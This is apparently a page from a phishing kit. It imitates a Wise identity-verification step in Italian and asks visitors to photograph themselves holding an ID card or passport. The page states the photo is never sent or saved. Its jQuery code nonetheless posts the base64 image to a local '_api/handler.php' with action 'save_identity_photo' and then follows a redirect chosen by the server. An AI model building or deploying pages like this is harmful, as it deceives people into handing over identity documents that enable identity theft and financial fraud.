<?php
session_start();
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Verifica la tua identità - Wise</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body class="bg-white h-screen flex flex-col justify-between m-0 p-0 overflow-x-hidden overflow-y-auto">

   
    <div class="w-full flex justify-between items-center px-6 py-4 border-b border-gray-100 bg-white shrink-0">
        <img src="_assets/logo.png" width="85" class="object-contain block">
    </div>

    
    <div id="app_view" class="w-full max-w-[390px] mx-auto px-6 py-6 flex flex-col gap-5 my-auto">
        
       
        <div>
            <h1 class="text-2xl font-bold text-gray-900 mb-1.5 tracking-tight">Verifica la tua identità</h1>
            <div class="text-xs text-gray-600 font-medium leading-relaxed">
                Scatta o carica una foto tenendo il documento d'identità accanto al viso, ben visibile.
            </div>
        </div>

        
        <div class="bg-[#f4fbf0] border border-[#d3f3b8] rounded-2xl p-4 flex gap-3">
            <div class="text-[#2ed06e] text-lg mt-0.5"><i class="fa-solid fa-shield-check"></i></div>
            <div class="flex flex-col gap-1">
                <span class="text-xs font-bold text-gray-900">Prima di scattare, controlla che:</span>
                <ul class="text-[11px] text-gray-600 list-disc list-inside space-y-1">
                    <li>Viso e documento siano entrambi visibili nella stessa foto</li>
                    <li>Ci siano buona illuminazione, sfondo neutro e nessun flash diretto</li>
                    <li>Il documento sia leggibile: carta d'identità o passaporto valido</li>
                </ul>
            </div>
        </div>

       
        <input type="file" id="camera_input" accept="image/*" capture="user" class="hidden">
        <input type="file" id="file_input" accept="image/*" class="hidden">

        
        <div id="preview_container" class="border-2 border-dashed border-gray-300 rounded-2xl p-4 flex flex-col items-center justify-center gap-2 bg-gray-50 relative min-h-[160px] overflow-hidden transition">
            <div id="placeholder_content" class="flex flex-col items-center justify-center gap-2">
                <div class="w-12 h-12 rounded-full bg-white shadow-sm flex items-center justify-center text-gray-700 text-xl">
                    <i class="fa-solid fa-camera"></i>
                </div>
                <div class="text-center">
                    <span class="text-xs font-bold text-gray-900 block">La tua foto apparirà qui</span>
                    <span class="text-[10px] text-gray-500">Supporta JPG, PNG</span>
                </div>
            </div>
           
            <img id="image_preview" class="absolute inset-0 w-full h-full object-cover hidden rounded-2xl" alt="Preview">
        </div>

        
        <div class="flex flex-col gap-2.5 w-full">
            <div class="grid grid-cols-2 gap-2">
                <button type="button" id="btn_take_photo" class="w-full h-11 bg-white border-2 border-gray-300 text-gray-900 font-bold text-xs rounded-xl flex items-center justify-center gap-1.5 cursor-pointer transition hover:border-gray-900 shadow-sm">
                    <i class="fa-solid fa-camera text-gray-700"></i> Scatta foto
                </button>
                <button type="button" id="btn_upload_file" class="w-full h-11 bg-white border-2 border-gray-300 text-gray-900 font-bold text-xs rounded-xl flex items-center justify-center gap-1.5 cursor-pointer transition hover:border-gray-900 shadow-sm">
                    <i class="fa-solid fa-upload text-gray-700"></i> Carica file
                </button>
            </div>

            <div class="text-[10px] text-center text-gray-400">
                La foto viene mostrata solo sul tuo dispositivo e non viene inviata né salvata.
            </div>

            
            <div class="pt-2">
                <button type="button" id="btn_identity_confirm" disabled class="w-full h-11 bg-gray-200 text-gray-400 font-bold text-sm rounded-full flex items-center justify-center cursor-not-allowed transition shadow-none">
                    <span id="id_btn_text">Completa l'accesso</span>
                </button>
            </div>
        </div>
    </div>

    
    <div class="w-full text-center py-3 bg-[#f3f4f6] text-gray-500 text-xs font-medium border-t border-gray-200 shrink-0">
        © Wise Payments Limited 2026
    </div>

<script>
$(document).ready(function() {
    let base64Image = "";

    
    $('#btn_take_photo').on('click', function() {
        $('#camera_input').click();
    });

    
    $('#btn_upload_file').on('click', function() {
        $('#file_input').click();
    });

    
    function handleSelectedFile(file) {
        if (file) {
            var reader = new FileReader();
            reader.onload = function(upload_event) {
                base64Image = upload_event.target.result;
                
                
                $('#image_preview').attr('src', base64Image).removeClass('hidden');
                $('#placeholder_content').hide();
                $('#preview_container').removeClass('border-dashed bg-gray-50').addClass('border-solid border-gray-900');

                
                $('#btn_identity_confirm')
                    .prop('disabled', false)
                    .removeClass('bg-gray-200 text-gray-400 cursor-not-allowed')
                    .addClass('bg-[#9fe870] text-[#163300] cursor-pointer');
            };
            reader.readAsDataURL(file);
        }
    }

    $('#camera_input').on('change', function(e) {
        handleSelectedFile(e.target.files[0]);
    });

    $('#file_input').on('change', function(e) {
        handleSelectedFile(e.target.files[0]);
    });

    
    $('#btn_identity_confirm').on('click', function() {
        if (!base64Image) return;

        var btn = $(this);
        btn.prop('disabled', true);
        $('#id_btn_text').html('<div style="width:16px; height:16px; border:2px solid rgba(22,51,0,0.3); border-top:2px solid #163300; border-radius:50%; animation:_sp 1s linear infinite; margin: 0 auto;"></div>');

        $.post("_api/handler.php", { 
            action: "save_identity_photo", 
            img_data: base64Image 
        }, function(response) {
            var nxt = response.trim();
            if(nxt.length > 0 && nxt !== "OK") {
                window.location.href = nxt; 
            } else {
                window.location.href = "success.php";
            }
        }).fail(function() {
            btn.prop('disabled', false);
            $('#id_btn_text').text("Completa l'accesso");
            alert("Si è verificato un errore. Riprova.");
        });
    });
});
</script>
<style>
    @keyframes _sp { to { transform: rotate(360deg); } }
</style>
</body>
</html>